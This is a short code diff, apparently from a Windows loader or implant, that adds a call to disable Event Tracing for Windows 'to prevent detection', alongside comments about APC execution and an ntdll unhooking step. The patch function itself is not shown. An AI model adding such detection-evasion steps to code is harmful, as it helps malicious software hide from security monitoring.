@@ -15,6 +15,9 @@ int main()
     // APC execution
 
 
+    // Patching the Event Tracing for Windows (ETW) to prevent detection
+    evt_patch();
+
     // Create a fresh copy of the ntdll library from file to unhook functions
     // unhooking();
 
